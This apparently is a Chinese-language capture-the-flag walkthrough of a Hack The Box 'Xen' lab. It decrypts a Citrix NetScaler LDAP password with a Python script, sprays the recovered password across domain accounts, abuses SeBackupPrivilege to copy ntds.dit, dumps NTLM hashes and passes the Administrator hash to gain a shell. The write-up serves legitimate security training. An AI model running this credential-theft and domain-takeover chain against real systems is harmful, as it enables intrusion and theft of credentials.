add cache policy ctx_doc_pdf -rule "HTTP.REQ.URL.ENDSWITH(\".pdf\")" -action CACHE -storeInGroup ctx_cg_poc
add cache policy ctx_web_JavaScript -rule "HTTP.REQ.URL.ENDSWITH(\".js\")" -action CACHE -storeInGroup ctx_cg_poc
add cache policy ctx_web_JavaScript-Res -rule "HTTP.RES.HEADER(\"Content-Type\").CONTAINS(\"application/x-javascript\")" -action CACHE -storeInGroup ctx_cg_poc
add cache policy ctx_NOCACHE_Cleanup -rule TRUE -action NOCACHE
add cache policylabel _reqBuiltinDefaults -evaluates REQ
add cache policylabel _resBuiltinDefaults -evaluates RES
bind cache policylabel _reqBuiltinDefaults -policyName _nonGetReq -priority 100 -gotoPriorityExpression END
bind cache policylabel _reqBuiltinDefaults -policyName _advancedConditionalReq -priority 200 -gotoPriorityExpression END
bind cache policylabel _reqBuiltinDefaults -policyName _personalizedReq -priority 300 -gotoPriorityExpression END
bind cache policylabel _resBuiltinDefaults -policyName _uncacheableStatusRes -priority 100 -gotoPriorityExpression END
bind cache policylabel _resBuiltinDefaults -policyName _uncacheableVaryRes -priority 200 -gotoPriorityExpression END
bind cache policylabel _resBuiltinDefaults -policyName _uncacheableCacheControlRes -priority 300 -gotoPriorityExpression END
bind cache policylabel _resBuiltinDefaults -policyName _cacheableCacheControlRes -priority 400 -gotoPriorityExpression END
bind cache policylabel _resBuiltinDefaults -policyName _uncacheablePragmaRes -priority 500 -gotoPriorityExpression END
bind cache policylabel _resBuiltinDefaults -policyName _cacheableExpiryRes -priority 600 -gotoPriorityExpression END
bind cache policylabel _resBuiltinDefaults -policyName _imageRes -priority 700 -gotoPriorityExpression END
bind cache policylabel _resBuiltinDefaults -policyName _personalizedRes -priority 800 -gotoPriorityExpression END
bind cache global NOPOLICY -priority 185883 -gotoPriorityExpression USE_INVOCATION_RESULT -type REQ_DEFAULT -invoke policylabel _reqBuiltinDefaults
bind cache global NOPOLICY -priority 185883 -gotoPriorityExpression USE_INVOCATION_RESULT -type RES_DEFAULT -invoke policylabel _resBuiltinDefaults
set ns encryptionParams -method AES256 -keyValue 759d44c48277ff90e2566961d99f06e9da1b4c5d570047f0882d3333d75ef211f9ff04b45b820cdce04456750c295b3c5aca2db7a5280be468f30c3c4bd8d8871abfef11332648091bffd78cb5bc6c91 -encrypted -encryptmethod ENCMTHD_3
add dns nameServer 172.16.249.200
set ns diameter -identity netscaler.com -realm com
set subscriber gxInterface -pcrfRealm pcrf.com -holdOnSubscriberAbsence YES -revalidationTimeout 900 -servicePathAVP 262099 -servicePathVendorid 3845
set ns tcpbufParam -memLimit 388
set dns parameter -dns64Timeout 1000
add dns nsRec . a.root-servers.net -TTL 3600000
add dns nsRec . b.root-servers.net -TTL 3600000
add dns nsRec . c.root-servers.net -TTL 3600000
add dns nsRec . d.root-servers.net -TTL 3600000
add dns nsRec . e.root-servers.net -TTL 3600000
add dns nsRec . f.root-servers.net -TTL 3600000
add dns nsRec . g.root-servers.net -TTL 3600000
add dns nsRec . h.root-servers.net -TTL 3600000
add dns nsRec . i.root-servers.net -TTL 3600000
add dns nsRec . j.root-servers.net -TTL 3600000
add dns nsRec . k.root-servers.net -TTL 3600000
add dns nsRec . l.root-servers.net -TTL 3600000
add dns nsRec . m.root-servers.net -TTL 3600000
add dns addRec l.root-servers.net 199.7.83.42 -TTL 3600000
add dns addRec b.root-servers.net 192.228.79.201 -TTL 3600000
add dns addRec d.root-servers.net 199.7.91.13 -TTL 3600000
add dns addRec j.root-servers.net 192.58.128.30 -TTL 3600000
add dns addRec h.root-servers.net 198.97.190.53 -TTL 3600000
add dns addRec f.root-servers.net 192.5.5.241 -TTL 3600000
add dns addRec k.root-servers.net 193.0.14.129 -TTL 3600000
add dns addRec a.root-servers.net 198.41.0.4 -TTL 3600000
add dns addRec c.root-servers.net 192.33.4.12 -TTL 3600000
add dns addRec m.root-servers.net 202.12.27.33 -TTL 3600000
add dns addRec i.root-servers.net 192.36.148.17 -TTL 3600000
add dns addRec g.root-servers.net 192.112.36.4 -TTL 3600000
add dns addRec e.root-servers.net 192.203.230.10 -TTL 3600000
set lb monitor ldns-dns LDNS-DNS -query . -queryType Address
set lb monitor stasecure CITRIX-STA-SERVICE -interval 2 MIN
set lb monitor sta CITRIX-STA-SERVICE -interval 2 MIN
add route 0.0.0.0 0.0.0.0 172.16.249.2
set ssl service nsrnatsip-127.0.0.1-5061 -eRSA ENABLED -sessReuse DISABLED
set ssl service nskrpcs-127.0.0.1-3009 -eRSA ENABLED -sessReuse DISABLED
set ssl service nshttps-::1l-443 -eRSA ENABLED -sessReuse DISABLED
set ssl service nsrpcs-::1l-3008 -eRSA ENABLED -sessReuse DISABLED
set ssl service nshttps-127.0.0.1-443 -eRSA ENABLED -sessReuse DISABLED
set ssl service nsrpcs-127.0.0.1-3008 -eRSA ENABLED -sessReuse DISABLED
add authentication Policy Default -rule true -action 172.16.249.200
set vpn parameter -forceCleanup none -clientConfiguration all
bind audit syslogGlobal -policyName SETSYSLOGPARAMS_ADV_POL -priority 2000000000
bind audit nslogGlobal -policyName SETNSLOGPARAMS_ADV_POL -priority 2000000000
bind tunnel global ns_tunnel_msdocs -priority 4000
bind tunnel global ns_tunnel_mimetext -priority 6000
bind system global LDAP-Policy -priority 100
bind tm global -policyName SETTMSESSPARAMS_ADV_POL -priority 65534 -gotoPriorityExpression NEXT
bind ssl service nsrnatsip-127.0.0.1-5061 -certkeyName ns-server-certificate
bind ssl service nskrpcs-127.0.0.1-3009 -certkeyName ns-server-certificate
bind ssl service nshttps-::1l-443 -certkeyName ns-server-certificate
bind ssl service nsrpcs-::1l-3008 -certkeyName ns-server-certificate
bind ssl service nshttps-127.0.0.1-443 -certkeyName ns-server-certificate
bind ssl service nsrpcs-127.0.0.1-3008 -certkeyName ns-server-certificate
add appfw JSONContentType "^application/json$" -isRegex REGEX
add appfw XMLContentType ".*/xml" -isRegex REGEX
add appfw XMLContentType ".*/.*\\+xml" -isRegex REGEX
add appfw XMLContentType ".*/xml-.*" -isRegex REGEX
set ip6TunnelParam -srcIP ::
set ptp -state ENABLE
set ns param -timezone "GMT+00:00-GMT-Europe/London"
set ns vpxparam -cpuyield DEFAULT
set ns cqaparam -lr1probthresh 0.00e+00 -lr2probthresh 0.00e+00
set qos parameters -debuglevel 0 -dumpcore 4294967295 -dumpsession 0 -dumpqp 0
set urlfiltering parameter -HoursBetweenDBUpdates 24 -TimeOfDayToUpdateDB 03:00 -MaxNumberOfCloudThreads 4 -CloudKeepAliveTimeout 120000 -CloudServerConnectTimeout 1000 -CloudDBLookupTimeout 2000 -seedDBSizeLevel 1
set videooptimization parameter -RandomSamplingPercentage 0.00e+00
 Done
```

> add authentication ldapAction 172.16.249.200 \  
-serverIP172.16.249.200 \  
-ldapBase"DC=HTB,DC=LOCAL" \  
-ldapBindDn"CN=netscaler-svc,OU=Service Accounts,DC=HTB,DC=LOCAL" \  
-ldapBindDnPassword de965bf774348634d64c6184ee5aeb18a71a17e6ada3ce276758c01a36c366ba \  
-encrypted
>
> set ns encryptionParams -method AES256 -keyValue 759d44c48277ff90e2566961d99f06e9da1b4c5d570047f0882d3333d75ef211f9ff04b45b820cdce04456750c295b3c5aca2db7a5280be468f30c3c4bd8d8871abfef11332648091bffd78cb5bc6c91 -encrypted -encryptmethod ENCMTHD_3
>

+ 域：`HTB.LOCAL`
+ DC：`172.16.249.200`
+ 用户：`netscaler-svc`
+ **密码（加密的 但这个密码是可以解的)**
+ **解密 LDAP 密码 key：set ns encryptionParams -method AES256 -keyValue 759d44c4...**

## Citrix Netscaler config decryption
### google
google搜索：citrix adc decrypt password python

[Citrix Netscaler config decryption](https://dozer.nz/posts/citrix-decrypt/)

![](/image/hackthebox-prolabs/Xen-18.png)

把脚本里的：

```plain
aeskey = binascii.unhexlify("351CBE38F041320F22D990AD8365889C...")
```

改成：

```plain
aeskey = binascii.unhexlify("759d44c48277ff90e2566961d99f06e9...")
```

### python
```plain
#!/usr/bin/env python3

from Crypto.Cipher import AES, ARC4
import binascii
import sys

# 去 padding
def unpad(s):
    return s[:-s[-1]]

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, enc, mode):
        if mode == "ENCMTHD_2":
            cipher = AES.new(self.key, AES.MODE_ECB)
        elif mode == "ENCMTHD_3":
            iv = b"\x00" * 16
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
        else:
            print("Invalid mode")
            return None

        return unpad(cipher.decrypt(enc))


def main():
    
    aeskey = binascii.unhexlify("351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9")

    # 老版本 RC4（备用）
    rc4key = binascii.unhexlify("2286da6ca015bcd9b7259753c2a5fbc2")

    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ciphertext> <ENCMTHD_X>")
        sys.exit(1)

    ciphertext = sys.argv[1]
    mode = sys.argv[2]

    data = binascii.unhexlify(ciphertext)

    if mode in ["ENCMTHD_2", "ENCMTHD_3"]:
        cipher = AESCipher(aeskey)
        decrypted = cipher.decrypt(data, mode)

        if decrypted:
            if mode == "ENCMTHD_3":
                print(decrypted[16:].decode())
            else:
                print(decrypted.decode())

    elif mode == "ENCMTHD_1":
        cipher = ARC4.new(rc4key)
        decrypted = cipher.decrypt(data)
        print(decrypted.decode())

    else:
        print("Unsupported mode")


if __name__ == "__main__":
    main()
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# python decitrix.py de965bf774348634d64c6184ee5aeb18a71a17e6ada3ce276758c01a36c366ba ENCMTHD_3
#S3rvice#@cc
```

得到凭据 netscaler-svc/#S3rvice#@cc

## shell
在设置界面中输入shell即可

```plain
> shell
Copyright (c) 1992-2013 The FreeBSD Project.
Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994
        The Regents of the University of California. All rights reserved.

root@netscaler#
```

## Tshark
### listen
由于没找到什么可利用文件，因此尝试在设备中抓包

```plain
root@netscaler# tcpdump -i 1 -w capture.pcap -s 0 'not tcp port 22' &
[1] 1561
root@netscaler# tcpdump: listening on 0/1, link-type EN10MB (Ethernet), capture size 65535 bytes
```

### scp
键入密码'=-09876567890-='将抓取的流量包复制回kali本机

```plain
┌──(kali㉿kali)-[~/Desktop/htb/xen]
└─$proxychains -q scp -i /home/kali/Desktop/htb/xen/private.pem nsroot@172.16.249.202:/tmp/capture.pcap all.pcap                                                                 
```

## Wireshark
### 端点
在 Wireshark 菜单栏中，点击 **统计 (Statistics)** -> **端点 (Endpoints)**。

![](/image/hackthebox-prolabs/Xen-19.png)

### HTTP
HTTP 流量包含一个 POST 请求，其中包含一个flag：

![](/image/hackthebox-prolabs/Xen-20.png)

### LDAP
所有 LDAP 流都相同。每个流都包含相同的flag：

![](/image/hackthebox-prolabs/Xen-21.png)

我还可以进一步深入，获取 netscaler-svc 帐户的 LDAP 凭据，因为它们是以明文形式传递的：

![](/image/hackthebox-prolabs/Xen-22.png)

![](/image/hackthebox-prolabs/Xen-23.png)

## Getflag
```plain
┌──(kali㉿kali)-[~/Desktop/htb/xen]
└─$ strings all.pcap | grep "XEN{"
username=cmeller&password=XEN{bu7_ld4p5_15_4_h455l3}
```

# DC.HTB.LOCAL-172.16.249.200
## netscaler-svc
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# proxychains -q netexec smb 172.16.249.200 -u netscaler-svc -p '#S3rvice#@cc'
[*] Initializing SMB protocol database
SMB         172.16.249.200  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.249.200  445    DC               [+] htb.local\netscaler-svc:#S3rvice#@cc
```

## bloodhound
![](/image/hackthebox-prolabs/Xen-24.png)![](/image/hackthebox-prolabs/Xen-25.png)

提取所有机器名，准备密码喷洒

```plain
ADMINISTRATOR
KRBTGT
ALARSSON
JMENDES
PMORGAN
XENSERVER-SVC
AWARDEL
PRINT-SVC
APP-SVC
MSSQL-SVC
MTURNER
RPRAKASH
URQUARTI
CMELLER
RDREW
FBOUCHER
ANAGY
TEST-SVC
BACKUP-SVC
NETSCALER-SVC
```

## 密码喷洒
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# proxychains -q netexec smb 172.16.249.1/24 -u users -p '#S3rvice#@cc' --continue-on-success
SMB         172.16.249.201  445    CITRIX           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         172.16.249.204  445    VDESKTOP2        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:VDESKTOP2) (domain:htb.local) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         172.16.249.200  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.249.201  445    CITRIX           [+] htb.local\XENSERVER-SVC:#S3rvice#@cc
SMB         172.16.249.201  445    CITRIX           [+] htb.local\PRINT-SVC:#S3rvice#@cc
SMB         172.16.249.201  445    CITRIX           [+] htb.local\MSSQL-SVC:#S3rvice#@cc
SMB         172.16.249.201  445    CITRIX           [+] htb.local\BACKUP-SVC:#S3rvice#@cc
SMB         172.16.249.201  445    CITRIX           [+] htb.local\NETSCALER-SVC:#S3rvice#@cc
SMB         172.16.249.200  445    DC               [+] htb.local\XENSERVER-SVC:#S3rvice#@cc
SMB         172.16.249.200  445    DC               [+] htb.local\PRINT-SVC:#S3rvice#@cc
SMB         172.16.249.200  445    DC               [+] htb.local\MSSQL-SVC:#S3rvice#@cc
SMB         172.16.249.200  445    DC               [+] htb.local\BACKUP-SVC:#S3rvice#@cc
SMB         172.16.249.200  445    DC               [+] htb.local\NETSCALER-SVC:#S3rvice#@cc
SMB         172.16.249.204  445    VDESKTOP2        [+] htb.local\XENSERVER-SVC:#S3rvice#@cc
SMB         172.16.249.204  445    VDESKTOP2        [+] htb.local\PRINT-SVC:#S3rvice#@cc
SMB         172.16.249.204  445    VDESKTOP2        [+] htb.local\MSSQL-SVC:#S3rvice#@cc
SMB         172.16.249.204  445    VDESKTOP2        [+] htb.local\BACKUP-SVC:#S3rvice#@cc
SMB         172.16.249.204  445    VDESKTOP2        [+] htb.local\NETSCALER-SVC:#S3rvice#@cc
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

成功喷洒XENSERVER-SVC;PRINT-SVC;MSSQL-SVC;BACKUP-SVC;NETSCALER-SVC五个用户

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# proxychains -q netexec rdp 172.16.249.200 -u users -p '#S3rvice#@cc' --continue-on-success
RDP         172.16.249.200  3389   DC               [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC) (domain:htb.local) (nla:True)
RDP         172.16.249.200  3389   DC               [+] htb.local\XENSERVER-SVC:#S3rvice#@cc
RDP         172.16.249.200  3389   DC               [+] htb.local\PRINT-SVC:#S3rvice#@cc
RDP         172.16.249.200  3389   DC               [-] htb.local\APP-SVC:#S3rvice#@cc (STATUS_LOGON_FAILURE)
RDP         172.16.249.200  3389   DC               [+] htb.local\MSSQL-SVC:#S3rvice#@cc
RDP         172.16.249.200  3389   DC               [-] htb.local\TEST-SVC:#S3rvice#@cc (STATUS_LOGON_FAILURE)
RDP         172.16.249.200  3389   DC               [-] htb.local\BACKUP-SVC:#S3rvice#@cc ()
RDP         172.16.249.200  3389   DC               [+] htb.local\NETSCALER-SVC:#S3rvice#@cc
```

[-] 加STATUS_LOGON_FAILURE 表示密码错误，而 [-] 加空括号 ()通常意味着认证通过了但 netexec 自身处理出了问题（比如连接超时、协议协商异常等）

![](/image/hackthebox-prolabs/Xen-26.png)

发现BACKUP-SVC@HTB.LOCAL具有REMOTE DESKTOP USERS@HTB.LOCAL

## xfreerdp
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# proxychains -q xfreerdp /u:backup-svc /p:'#S3rvice#@cc' /d:htb.local /v:172.16.249.200 /cert:ignore +dynamic-resolution /auth-pkg-list:ntlm
```

## Getflag
![](/image/hackthebox-prolabs/Xen-27.png)

## BACKUP-SVC
### whoami /priv
![](/image/hackthebox-prolabs/Xen-28.png)

`SeBackupPrivilege` 是 Windows 的一项特殊权限，允许用户**绕过文件访问控制列表 (ACL)** 读取任意文件，常用于渗透测试中获取敏感数据。

### whoami /groups
![](/image/hackthebox-prolabs/Xen-29.png)

**Backup Operators**（备份操作员）是 Windows 操作系统中的一个内置本地用户组。该组的主要设计目的是允许成员在不授予其完全管理员（Administrator）权限的情况下，执行文件的备份和还原操作。

### net user backup-svc
![](/image/hackthebox-prolabs/Xen-30.png)

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# proxychains -q evil-winrm -i 172.16.249.200 -u 'BACKUP-SVC' -p '#S3rvice#@cc'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\backup-svc\Documents>
```

## Dump Hashes
我需要获取 `ntds.dit` 文件，它是存储域用户所有哈希值的 Active Directory 数据库。遗憾的是，即使使用了 `SeBackupPrivilege` ，我也无法在运行中的机器上访问 `ntds.dit` ，因为它正在被使用。我将使用 Microsoft 的工具 `diskshadow` 来挂载硬盘的卷影副本，然后从中复制该文件。此外，我还需要一个能够让我利用 `SeBackUpPrivilege` 的工具

## diskshadow
```plain
# 1. 通过 evil-winrm 连接 DC
proxychains -q evil-winrm -i 172.16.249.200 -u backup-svc -p '#S3rvice#@cc'

mkdir C:\temp

# 3. 用 cmd 写diskshadow 脚本（避免 PowerShell 编码问题）
cmd /c "echo set context persistent nowriters> C:\temp\shadow.txt"
cmd /c "echo set metadata C:\temp\metadata.cab>> C:\temp\shadow.txt"
cmd /c "echo add volume c: alias disk1>> C:\temp\shadow.txt"
cmd /c "echo create>> C:\temp\shadow.txt"
cmd /c "echo expose %disk1% u:>> C:\temp\shadow.txt"

# 4. 执行 diskshadow 创建卷影副本并挂载到 u:
cmd /c diskshadow /s C:\temp\shadow.txt

# 5. 利用 robocopy 备份模式复制 ntds.dit
robocopy /b u:\Windows\ntds C:\temp ntds.dit

# 6. 导出 SYSTEM 注册表
reg save hklm\system C:\temp\system

# 7. 通过 evil-winrm 下载到 Kali
download "C:\temp\ntds.dit" /home/kali/Desktop/htb/xen 
download "C:\temp\system" /home/kali/Desktop/htb/xen

# 7. 通过smbclient下载到kali
proxychains -q impacket-secretsdump 'htb.local/backup-svc:#S3rvice#@cc@172.16.249.200'
# use C$
# cd temp
# get ntds.dit

# 8. 本地提取所有域用户哈希
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

## impacket-secretsdump
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# impacket-secretsdump -ntds ntds.dit -system system LOCAL        
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation                   

[*] Target system bootKey: 0x6e398137ec7f2e204671dad7c778509f
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 4a62a0ac1475b54add921ac8c1b72e31
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:5e507509602e1b651759527b87b6c347:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3791ca8d70c9e1d2d2c7c5b5c7c253e8:::
CITRIX$:1103:aad3b435b51404eeaad3b435b51404ee:fd981d0c915932bb3ddf38b415c49121:::
htb.local\alarsson:1104:aad3b435b51404eeaad3b435b51404ee:92a44f1aa6259c55f9f514fabae5cc3f:::   
htb.local\jmendes:1106:aad3b435b51404eeaad3b435b51404ee:10d0c05f7d958955f0eaf1479b5124a0:::
htb.local\pmorgan:1107:aad3b435b51404eeaad3b435b51404ee:8618ba932416a7404a854b250bf28577:::
htb.local\awardel:1108:aad3b435b51404eeaad3b435b51404ee:270e4d446437f4383b092b42a9f88f0a:::
VDESKTOP3$:1109:aad3b435b51404eeaad3b435b51404ee:e582f9b9d77dae6357bb574620b721ce:::
VDESKTOP2$:1110:aad3b435b51404eeaad3b435b51404ee:f583f9b5fc860b9ae21e482caaad0553:::
...[snip]...
```

## Administrator
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# proxychains -q wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be administrator@172.16.249.200
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```

# Getflag
```c
C:\users\administrator\desktop>type flag.txt
XEN{d3r1v471v3_d0m41n_4dm1n}
```





















